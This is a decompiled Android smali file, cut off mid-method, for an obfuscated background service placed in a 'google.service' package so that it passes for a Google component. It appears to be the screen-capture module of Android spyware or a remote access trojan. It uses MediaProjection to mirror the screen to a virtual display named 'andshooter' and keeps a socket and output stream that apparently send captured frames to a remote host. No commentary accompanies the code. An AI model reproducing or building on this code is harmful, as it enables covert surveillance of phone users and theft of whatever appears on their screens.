.class public Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;
.super Landroid/app/Service;
.source "\u03c6$\ufe76\u03b8$\u2da8\u1d4e\u20ab\u2db1\u2db1\u20ab\u02c9\u0999\u02be$\u4240\u4240\u05d9\u3164\u2db1\u02be\u0cf2\u1d62\u1d62\u02cb\u2db1\u2db1\u02cb\u0999\u3164\u1d62\u02be4791.java"


# static fields
.field static final ACTION_RECORD:Ljava/lang/String; = "splash.app.main.RECORD"

.field static final ACTION_SHUTDOWN:Ljava/lang/String; = "splash.app.main.SHUTDOWN"

.field private static final CHANNEL_WHATEVER:Ljava/lang/String; = "Scaning"

.field static final EXTRA_RESULT_CODE:Ljava/lang/String; = "resultCode"

.field static final EXTRA_RESULT_INTENT:Ljava/lang/String; = "resultIntent"

.field public static FPS:I = 0x0

.field private static ISON:Z = false

.field private static final NOTIFY_ID:I = 0x26b2

.field public static Q:I = 0x0

.field static final VIRT_DISPLAY_FLAGS:I = 0x9

.field private static sk:Ljava/net/Socket;

.field public static syc:Ljava/lang/Object;


# instance fields
.field public Lo:Z

.field public bts:Ljava/util/List;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Ljava/util/List<",
            "[B>;"
        }
    .end annotation
.end field

.field public ctd:Z

.field private handler:Landroid/os/Handler;

.field private final handlerThread:Landroid/os/HandlerThread;

.field private it:Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;

.field private mgr:Landroid/media/projection/MediaProjectionManager;

.field private out:Ljava/io/OutputStream;

.field private projection:Landroid/media/projection/MediaProjection;

.field private resultCode:I

.field private resultData:Landroid/content/Intent;

.field public usd:Z

.field private vdisplay:Landroid/hardware/display/VirtualDisplay;

.field private wmgr:Landroid/view/WindowManager;


# direct methods
.method static constructor <clinit>()V
    .locals 1

    .line 124
    new-instance v0, Ljava/lang/Object;

    invoke-direct {v0}, Ljava/lang/Object;-><init>()V

    sput-object v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->syc:Ljava/lang/Object;

    const/4 v0, 0x0

    .line 125
    sput-boolean v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->ISON:Z

    return-void
.end method

.method public constructor <init>()V
    .locals 3

    .line 31
    invoke-direct {p0}, Landroid/app/Service;-><init>()V

    .line 48
    new-instance v0, Landroid/os/HandlerThread;

    .line 49
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getSimpleName()Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0xa

    invoke-direct {v0, v1, v2}, Landroid/os/HandlerThread;-><init>(Ljava/lang/String;I)V

    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->handlerThread:Landroid/os/HandlerThread;

    .line 123
    new-instance v0, Ljava/util/ArrayList;

    invoke-direct {v0}, Ljava/util/ArrayList;-><init>()V

    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->bts:Ljava/util/List;

    const/4 v0, 0x0

    .line 126
    iput-boolean v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->usd:Z

    iput-boolean v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->ctd:Z

    iput-boolean v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->Lo:Z

    return-void
.end method

.method static synthetic access$000()Z
    .locals 1

    .line 31
    sget-boolean v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->ISON:Z

    return v0
.end method

.method static synthetic access$002(Z)Z
    .locals 0

    .line 31
    sput-boolean p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->ISON:Z

    return p0
.end method

.method static synthetic access$100()Ljava/net/Socket;
    .locals 1

    .line 31
    sget-object v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->sk:Ljava/net/Socket;

    return-object v0
.end method

.method static synthetic access$102(Ljava/net/Socket;)Ljava/net/Socket;
    .locals 0

    .line 31
    sput-object p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->sk:Ljava/net/Socket;

    return-object p0
.end method

.method static synthetic access$200(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)Ljava/io/OutputStream;
    .locals 0

    .line 31
    iget-object p0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->out:Ljava/io/OutputStream;

    return-object p0
.end method

.method static synthetic access$202(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;Ljava/io/OutputStream;)Ljava/io/OutputStream;
    .locals 0

    .line 31
    iput-object p1, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->out:Ljava/io/OutputStream;

    return-object p1
.end method

.method static synthetic access$300(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)V
    .locals 0

    .line 31
    invoke-direct {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->stopCapture()V

    return-void
.end method

.method static synthetic access$400(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)V
    .locals 0

    .line 31
    invoke-direct {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->di()V

    return-void
.end method

.method static synthetic access$500(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)V
    .locals 0

    .line 31
    invoke-direct {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->startCapture()V

    return-void
.end method

.method static synthetic access$600(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)Landroid/hardware/display/VirtualDisplay;
    .locals 0

    .line 31
    iget-object p0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    return-object p0
.end method

.method private di()V
    .locals 1

    const/4 v0, 0x0

    .line 213
    iput-boolean v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->Lo:Z

    .line 214
    :try_start_0
    sget-object v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownOutput()V
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    .line 215
    :catch_0
    :try_start_1
    sget-object v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->shutdownInput()V
    :try_end_1
    .catch Ljava/net/SocketException; {:try_start_1 .. :try_end_1} :catch_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 216
    :catch_1
    :try_start_2
    sget-object v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_2
    .catch Ljava/net/SocketException; {:try_start_2 .. :try_end_2} :catch_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_2

    .line 217
    :catch_2
    :try_start_3
    sget-object v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->getInputStream()Ljava/io/InputStream;

    move-result-object v0

    invoke-virtual {v0}, Ljava/io/InputStream;->close()V
    :try_end_3
    .catch Ljava/net/SocketException; {:try_start_3 .. :try_end_3} :catch_3
    .catch Ljava/io/IOException; {:try_start_3 .. :try_end_3} :catch_3

    .line 218
    :catch_3
    :try_start_4
    sget-object v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->sk:Ljava/net/Socket;

    invoke-virtual {v0}, Ljava/net/Socket;->close()V
    :try_end_4
    .catch Ljava/net/SocketException; {:try_start_4 .. :try_end_4} :catch_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_0

    :catch_4
    nop

    .line 219
    :goto_0
    iget-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->out:Ljava/io/OutputStream;

    if-eqz v0, :cond_0

    :try_start_5
    invoke-virtual {v0}, Ljava/io/OutputStream;->close()V
    :try_end_5
    .catch Ljava/net/SocketException; {:try_start_5 .. :try_end_5} :catch_5
    .catch Ljava/io/IOException; {:try_start_5 .. :try_end_5} :catch_5

    :catch_5
    const/4 v0, 0x0

    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->out:Ljava/io/OutputStream;

    :cond_0
    return-void
.end method

.method private foregroundify()V
    .locals 2

    .line 311
    new-instance v0, Landroid/content/Intent;

    const-class v1, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;

    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v1, "splash.app.main.RECORD"

    .line 313
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setAction(Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v0

    .line 315
    invoke-virtual {p0, v0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    return-void
.end method

.method private startCapture()V
    .locals 10

    .line 262
    iget-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->mgr:Landroid/media/projection/MediaProjectionManager;

    iget v1, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->resultCode:I

    iget-object v2, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->resultData:Landroid/content/Intent;

    invoke-virtual {v0, v1, v2}, Landroid/media/projection/MediaProjectionManager;->getMediaProjection(ILandroid/content/Intent;)Landroid/media/projection/MediaProjection;

    move-result-object v0

    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->projection:Landroid/media/projection/MediaProjection;

    .line 263
    new-instance v0, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;

    invoke-direct {v0, p0}, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;-><init>(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)V

    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->it:Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;

    .line 265
    new-instance v0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$4;

    invoke-direct {v0, p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$4;-><init>(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)V

    .line 272
    iget-object v1, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->projection:Landroid/media/projection/MediaProjection;

    iget-object v2, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->it:Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;

    .line 273
    invoke-virtual {v2}, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->getWidth()I

    move-result v3

    iget-object v2, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->it:Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;

    invoke-virtual {v2}, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->getHeight()I

    move-result v4

    .line 274
    invoke-virtual {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->getResources()Landroid/content/res/Resources;

    move-result-object v2

    invoke-virtual {v2}, Landroid/content/res/Resources;->getDisplayMetrics()Landroid/util/DisplayMetrics;

    move-result-object v2

    iget v5, v2, Landroid/util/DisplayMetrics;->densityDpi:I

    iget-object v2, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->it:Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;

    .line 275
    invoke-virtual {v2}, Lgoogle/service/₫ˋﹶʻʼﹶ䉀ⶱ$$ⶱـㅤᴵ$$ٴˋʻʻʿʾⶱ4790;->getSurface()Landroid/view/Surface;

    move-result-object v7

    iget-object v9, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->handler:Landroid/os/Handler;

    const-string v2, "andshooter"

    const/16 v6, 0x9

    const/4 v8, 0x0

    .line 272
    invoke-virtual/range {v1 .. v9}, Landroid/media/projection/MediaProjection;->createVirtualDisplay(Ljava/lang/String;IIIILandroid/view/Surface;Landroid/hardware/display/VirtualDisplay$Callback;Landroid/os/Handler;)Landroid/hardware/display/VirtualDisplay;

    move-result-object v1

    iput-object v1, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    .line 276
    iget-object v1, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->projection:Landroid/media/projection/MediaProjection;

    iget-object v2, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->handler:Landroid/os/Handler;

    invoke-virtual {v1, v0, v2}, Landroid/media/projection/MediaProjection;->registerCallback(Landroid/media/projection/MediaProjection$Callback;Landroid/os/Handler;)V

    return-void
.end method

.method private stopCapture()V
    .locals 1

    .line 254
    iget-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->projection:Landroid/media/projection/MediaProjection;

    if-eqz v0, :cond_0

    .line 255
    invoke-virtual {v0}, Landroid/media/projection/MediaProjection;->stop()V

    .line 256
    iget-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->vdisplay:Landroid/hardware/display/VirtualDisplay;

    invoke-virtual {v0}, Landroid/hardware/display/VirtualDisplay;->release()V

    const/4 v0, 0x0

    .line 257
    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->projection:Landroid/media/projection/MediaProjection;

    :cond_0
    return-void
.end method


# virtual methods
.method public FindNewIcon()V
    .locals 2

    .line 176
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$2;

    invoke-direct {v1, p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791$2;-><init>(Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    .line 209
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method getHandler()Landroid/os/Handler;
    .locals 1

    .line 227
    iget-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->handler:Landroid/os/Handler;

    return-object v0
.end method

.method getWindowManager()Landroid/view/WindowManager;
    .locals 1

    .line 223
    iget-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->wmgr:Landroid/view/WindowManager;

    return-object v0
.end method

.method public onBind(Landroid/content/Intent;)Landroid/os/IBinder;
    .locals 1

    .line 120
    new-instance p1, Ljava/lang/IllegalStateException;

    const-string v0, "Binding not supported."

    invoke-direct {p1, v0}, Ljava/lang/IllegalStateException;-><init>(Ljava/lang/String;)V

    throw p1
.end method

.method public onCreate()V
    .locals 2

    .line 62
    invoke-super {p0}, Landroid/app/Service;->onCreate()V

    const-string v0, "media_projection"

    .line 64
    invoke-virtual {p0, v0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/media/projection/MediaProjectionManager;

    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->mgr:Landroid/media/projection/MediaProjectionManager;

    const-string v0, "window"

    .line 65
    invoke-virtual {p0, v0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->wmgr:Landroid/view/WindowManager;

    .line 67
    iget-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v0}, Landroid/os/HandlerThread;->start()V

    .line 68
    new-instance v0, Landroid/os/Handler;

    iget-object v1, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->handlerThread:Landroid/os/HandlerThread;

    invoke-virtual {v1}, Landroid/os/HandlerThread;->getLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    iput-object v0, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->handler:Landroid/os/Handler;

    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 112
    invoke-direct {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->stopCapture()V

    .line 114
    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    .line 75
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    if-nez p2, :cond_0

    const/16 p2, 0x539

    const-string p3, "resultCode"

    .line 76
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    iput p2, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->resultCode:I

    const-string p2, "resultIntent"

    .line 77
    invoke-virtual {p1, p2}, Landroid/content/Intent;->getParcelableExtra(Ljava/lang/String;)Landroid/os/Parcelable;

    move-result-object p2

    check-cast p2, Landroid/content/Intent;

    iput-object p2, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->resultData:Landroid/content/Intent;

    const/16 p2, 0xa

    const-string p3, "Q"

    .line 78
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p2

    sput p2, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->Q:I

    const/4 p2, 0x5

    const-string p3, "F"

    .line 79
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->getIntExtra(Ljava/lang/String;I)I

    move-result p1

    sput p1, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->FPS:I

    .line 80
    invoke-direct {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->foregroundify()V

    goto :goto_0

    .line 82
    :cond_0
    invoke-virtual {p1}, Landroid/content/Intent;->getAction()Ljava/lang/String;

    move-result-object p2

    const-string p3, "splash.app.main.RECORD"

    invoke-virtual {p3, p2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p2

    if-eqz p2, :cond_2

    .line 83
    iget-object p1, p0, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->resultData:Landroid/content/Intent;

    if-eqz p1, :cond_1

    .line 86
    invoke-virtual {p0}, Lgoogle/service/φ$ﹶθ$ⶨᵎ₫ⶱⶱ₫ˉঙʾ$䉀䉀יㅤⶱʾೲᵢᵢˋⶱⶱˋঙㅤᵢʾ4791;->FindNewIcon()V

    goto :goto_0

    .line 89
    :cond_1
    new-instance p1, Landroid/content/Intent;

    const-class p2, Lgoogle/service/ʾʾㅤﹶˎʽʾיφʿˉˎⶱⶱˆφיˊـˉʽ4788;

    invoke-direct {p1, p0, p2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 p2, 0x10000000

    .line 91
    invoke-virtual {p1, p2}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    move-result-object p1

    .line 93
